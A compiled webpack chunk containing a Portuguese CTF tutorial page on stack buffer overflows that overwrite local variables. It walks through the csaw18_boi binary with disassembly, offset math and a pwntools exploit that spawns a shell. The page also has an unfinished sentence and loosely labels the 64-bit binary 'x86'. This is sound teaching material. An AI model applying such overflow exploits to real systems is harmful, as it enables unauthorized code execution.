"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[896],{6084(e,r,o){o.r(r),o.d(r,{assets:()=>d,contentTitle:()=>c,default:()=>x,frontMatter:()=>i,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"pwning/bof/2-1-bof-variables","title":"Buffer Overflow - Vari\xe1veis","description":"Como vimos, podemos sobrescrever vari\xe1veis com buffer overflow. Mas como podemos fazer isso?","source":"@site/docs/pwning/bof/2-1-bof-variables.md","sourceDirName":"pwning/bof","slug":"/pwning/bof/2-1-bof-variables","permalink":"/manual-pwning/docs/pwning/bof/2-1-bof-variables","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"title":"Buffer Overflow - Vari\xe1veis","sidebar_position":3},"sidebar":"tutorialSidebar","previous":{"title":"Introdu\xe7\xe3o ao Buffer Overflow","permalink":"/manual-pwning/docs/pwning/bof/2-0-bof"},"next":{"title":"Buffer Overflow - Call Function","permalink":"/manual-pwning/docs/pwning/bof/2-2-bof-callfunction"}}');var n=o(4848),s=o(8453);const i={title:"Buffer Overflow - Vari\xe1veis",sidebar_position:3},c=void 0,d={},l=[{value:"2.2.1 csaw18_boi",id:"221-csaw18_boi",level:3}];function t(e){const r={a:"a",code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(r.p,{children:"Como vimos, podemos sobrescrever vari\xe1veis com buffer overflow. Mas como podemos fazer isso?"}),"\n",(0,n.jsxs)(r.ol,{children:["\n",(0,n.jsxs)(r.li,{children:["Verifique informa\xe7\xf5es do arquivo com ",(0,n.jsx)(r.code,{children:"file arquivo"})]}),"\n",(0,n.jsx)(r.li,{children:"Abra o programa no Ghidra ou Debugger"}),"\n",(0,n.jsxs)(r.li,{children:["Verifique se a vari\xe1vel que queremos sobrescrever est\xe1 ",(0,n.jsxs)(r.strong,{children:["entre a vari\xe1vel do input e o ",(0,n.jsx)(r.code,{children:"rbp"})," na stack"]})]}),"\n",(0,n.jsxs)(r.li,{children:["Se estiver, podemos sobrescrever. ",(0,n.jsx)(r.strong,{children:"Calcule a dist\xe2ncia para chegar no in\xedcio da vari\xe1vel desejada, e sobrescreva com caracteres quaisquer"}),".","\n",(0,n.jsxs)(r.ol,{children:["\n",(0,n.jsxs)(r.li,{children:["Basicamente, teremos nosso input como ",(0,n.jsx)(r.code,{children:"rbp-0x10"}),", por exemplo, e a outra vari\xe1vel em ",(0,n.jsx)(r.code,{children:"rbp-0x5"}),". Isso quer dizer que a dist\xe2ncia entre eles \xe9 ",(0,n.jsx)(r.code,{children:"0x10 - 0x5 = 0xb = 11"}),". Ou seja, para chegarmos no ",(0,n.jsx)(r.strong,{children:"in\xedcio"})," de ",(0,n.jsx)(r.code,{children:"rbp-0x5"}),", precisamos sobrescrever a stack com 11 bytes quaisquer."]}),"\n",(0,n.jsx)(r.li,{children:"Geralmente, usamos caracteres, pois cada caractere = 1 byte e fica f\xe1cil de contabilizar."}),"\n"]}),"\n"]}),"\n",(0,n.jsxs)(r.li,{children:["Ao final da string, ",(0,n.jsx)(r.strong,{children:"coloque o que voc\xea deseja que seja sobrescrito na vari\xe1vel"}),"."]}),"\n"]}),"\n",(0,n.jsxs)(r.p,{children:[(0,n.jsx)(r.strong,{children:"Aten\xe7\xe3o"}),": Voc\xea precisa respeitar a quantidade de espa\xe7o de cada vari\xe1vel. Se a vari\xe1vel possui 4 bytes e voc\xea sobrescrever apenas 3, um byte ser\xe1 lixo de mem\xf3ria, e vai interferir no valor da vari\xe1vel."]}),"\n",(0,n.jsxs)(r.p,{children:[(0,n.jsx)(r.strong,{children:"Curiosidade"}),": \xc0s vezes voc\xea n\xe3o possui um excedente necess\xe1rio para fazer Buffer Overflow. Mas, em alguns casos, voc\xea pode usar BOF para ",(0,n.jsx)(r.strong,{children:"modificar a format string"})," que define o limite de leitura do input. Isso s\xf3 \xe9 poss\xedvel se a format string estiver na stack (na maioria dos casos ela est\xe1 em uma regi\xe3o de dados separada, onde h\xe1 apenas dados constantes, que n\xe3o s\xe3o vari\xe1veis)."]}),"\n",(0,n.jsxs)(r.p,{children:["Abaixo, temos alguns bin\xe1rios que ficam para voc\xea como li\xe7\xe3o de casa. Tente resolv\xea-los e veja o solve caso tenha dificuldade. Os arquivos est\xe3o ",(0,n.jsx)(r.a,{href:"./bins_and_solves/04-bof_variable/",children:"aqui"}),"."]}),"\n",(0,n.jsx)(r.h3,{id:"221-csaw18_boi",children:"2.2.1 csaw18_boi"}),"\n",(0,n.jsx)(r.p,{children:"Antes, vamos ver algumas informa\xe7\xf5es sobre o arquivo:"}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:"$ file boi\r\n\r\nboi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped\n"})}),"\n",(0,n.jsxs)(r.p,{children:["Veja que temos um arquivo em ",(0,n.jsx)(r.code,{children:"x86"}),". Isso quer dizer que"]}),"\n",(0,n.jsx)(r.p,{children:"Vejamos a main de um programa abaixo:"}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:"0x0000000000400641 <+0>:     push   rbp\r\n   0x0000000000400642 <+1>:     mov    rbp,rsp\r\n   0x0000000000400645 <+4>:     sub    rsp,0x40\r\n   0x0000000000400649 <+8>:     mov    DWORD PTR [rbp-0x34],edi\r\n   0x000000000040064c <+11>:    mov    QWORD PTR [rbp-0x40],rsi\r\n   0x0000000000400650 <+15>:    mov    rax,QWORD PTR fs:0x28\r\n   0x0000000000400659 <+24>:    mov    QWORD PTR [rbp-0x8],rax\r\n   0x000000000040065d <+28>:    xor    eax,eax\r\n   0x000000000040065f <+30>:    mov    QWORD PTR [rbp-0x30],0x0\r\n   0x0000000000400667 <+38>:    mov    QWORD PTR [rbp-0x28],0x0\r\n   0x000000000040066f <+46>:    mov    QWORD PTR [rbp-0x20],0x0\r\n   0x0000000000400677 <+54>:    mov    DWORD PTR [rbp-0x18],0x0\r\n   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef\r\n   0x0000000000400685 <+68>:    mov    edi,0x400764\r\n   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>\r\n   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]\r\n   0x0000000000400693 <+82>:    mov    edx,0x18\r\n   0x0000000000400698 <+87>:    mov    rsi,rax\r\n   0x000000000040069b <+90>:    mov    edi,0x0\r\n   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>\r\n   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]\r\n   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee\r\n   0x00000000004006ad <+108>:   jne    0x4006bb <main+122>\r\n   0x00000000004006af <+110>:   mov    edi,0x40077c\r\n   0x00000000004006b4 <+115>:   call   0x400626 <run_cmd>\r\n   0x00000000004006b9 <+120>:   jmp    0x4006c5 <main+132>\r\n   0x00000000004006bb <+122>:   mov    edi,0x400786\r\n   0x00000000004006c0 <+127>:   call   0x400626 <run_cmd>\r\n   0x00000000004006c5 <+132>:   mov    eax,0x0\r\n   0x00000000004006ca <+137>:   mov    rcx,QWORD PTR [rbp-0x8]\r\n   0x00000000004006ce <+141>:   xor    rcx,QWORD PTR fs:0x28\r\n   0x00000000004006d7 <+150>:   je     0x4006de <main+157>\r\n   0x00000000004006d9 <+152>:   call   0x4004e0 <__stack_chk_fail@plt>\r\n   0x00000000004006de <+157>:   leave\r\n   0x00000000004006df <+158>:   ret\n"})}),"\n",(0,n.jsxs)(r.p,{children:["Podemos ver que o programa verifica se a vari\xe1vel ",(0,n.jsx)(r.code,{children:"rbp-0x1c"})," \xe9 igual a ",(0,n.jsx)(r.code,{children:"0xcaf3baee"})," (sim, \xe9 um n\xfamero inteiro expresso em hexadecimal), ou seja, um IF:"]}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:"   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]\r\n   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee\n"})}),"\n",(0,n.jsxs)(r.p,{children:["Se esta condi\xe7\xe3o for verdadeira, isso ir\xe1 abrir uma shell, ou seja, o ",(0,n.jsx)(r.code,{children:"run_cmd"})," nos permite executar comandos (se tivermos acesso a isso, obtemos acesso completo ao servidor onde o arquivo roda)."]}),"\n",(0,n.jsxs)(r.p,{children:["Se verificarmos, a vari\xe1vel ",(0,n.jsx)(r.code,{children:"rbp-0x1c"})," \xe9 inicializada antes com ",(0,n.jsx)(r.code,{children:"0xdeadbeef"}),":"]}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:"   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef\n"})}),"\n",(0,n.jsxs)(r.p,{children:["Por\xe9m, o problema \xe9 que a vari\xe1vel passada para o ",(0,n.jsx)(r.code,{children:"read"}),", que l\xea o input e atribui a uma vari\xe1vel, \xe9 outra completamente diferente:"]}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:"   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]\r\n   0x0000000000400693 <+82>:    mov    edx,0x18\r\n   0x0000000000400698 <+87>:    mov    rsi,rax\r\n   0x000000000040069b <+90>:    mov    edi,0x0\r\n   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>\n"})}),"\n",(0,n.jsxs)(r.p,{children:["Vemos que a vari\xe1vel passada como par\xe2metro \xe9 ",(0,n.jsx)(r.code,{children:"rbp-0x30"})," (os registradores ",(0,n.jsx)(r.code,{children:"rsi"}),", ",(0,n.jsx)(r.code,{children:"rdi"})," s\xe3o usados para passar argumentos para fun\xe7\xf5es). Ou seja, esse \xe9 o input no qual colocamos uma string."]}),"\n",(0,n.jsxs)(r.p,{children:["A fun\xe7\xe3o ",(0,n.jsx)(r.code,{children:"read"})," n\xe3o possui limite de leitura, ent\xe3o podemos fazer um Buffer Overflow."]}),"\n",(0,n.jsxs)(r.p,{children:["Temos o input ",(0,n.jsx)(r.code,{children:"rbp-0x30"})," e a vari\xe1vel que queremos sobrescrever em ",(0,n.jsx)(r.code,{children:"rbp-0x1c"}),". Como ",(0,n.jsx)(r.code,{children:"0x1c < 0x30"}),", a vari\xe1vel desejada est\xe1 entre nosso input e o ",(0,n.jsx)(r.code,{children:"rbp"}),", portanto podemos sobrescrever."]}),"\n",(0,n.jsxs)(r.p,{children:["A dist\xe2ncia entre o input e a vari\xe1vel \xe9 ",(0,n.jsx)(r.code,{children:"0x30-0x1c = 0x14 = 20"}),". Portanto, precisamos encher 20 casas com caracteres e depois colocar o que queremos. Vamos fazer isso com pwntools, em python:"]}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{className:"language-py",children:"# Importa pwntools\r\nfrom pwn import *\r\n\r\n# Estabelece o processo alvo\r\ntarget = process('./boi')\r\n\r\n# Faz o payload\r\n# 0x14 bytes de dados quaisquer para encher o espa\xe7o entre\r\n# o in\xedcio de nosso input e o in\xedcio da vari\xe1vel alvo (inteiro)\r\n# 0x4 byte int we will overwrite target with\r\npayload = b\"0\"*0x14 + p32(0xcaf3baee)\r\n\r\n# Send the payload\r\ntarget.send(payload)\r\n\r\n# Drop to an interactive shell so we can interact with our shell\r\ntarget.interactive()\n"})}),"\n",(0,n.jsxs)(r.p,{children:["Um ponto importante \xe9 que, como o arquivo est\xe1 em ",(0,n.jsx)(r.code,{children:"x86"}),", precisamos empacotar o valor ",(0,n.jsx)(r.code,{children:"0xcaf3baee"})," para ocupar 4 bytes, al\xe9m de deixar em little endian. A fun\xe7\xe3o ",(0,n.jsx)(r.code,{children:"p32()"})," faz isto para n\xf3s."]}),"\n",(0,n.jsx)(r.p,{children:"Quando rodamos o script..."}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:"$ python3 exploit.py\r\n[+] Starting local process './boi': pid 4700\r\n[*] Switching to interactive mode\r\nAre you a big boiiiii??\r\n$ hey\r\n/bin/bash: line 1: hey: command not found\r\n$ ls\r\nboi  exploit.py  input  Readme.md\n"})}),"\n",(0,n.jsx)(r.p,{children:"Sobrescrever a vari\xe1vel validou a condi\xe7\xe3o que estava sendo verificada. Isto abriu para n\xf3s uma shell! (podemos digitar comandos e navegar pelo servidor onde o arquivo est\xe1 sendo executado)"}),"\n",(0,n.jsx)(r.p,{children:"Chall completo :)"})]})}function x(e={}){const{wrapper:r}={...(0,s.R)(),...e.components};return r?(0,n.jsx)(r,{...e,children:(0,n.jsx)(t,{...e})}):t(e)}},8453(e,r,o){o.d(r,{R:()=>i,x:()=>c});var a=o(6540);const n={},s=a.createContext(n);function i(e){const r=a.useContext(s);return a.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:i(e.components),a.createElement(s.Provider,{value:r},e.children)}}}]);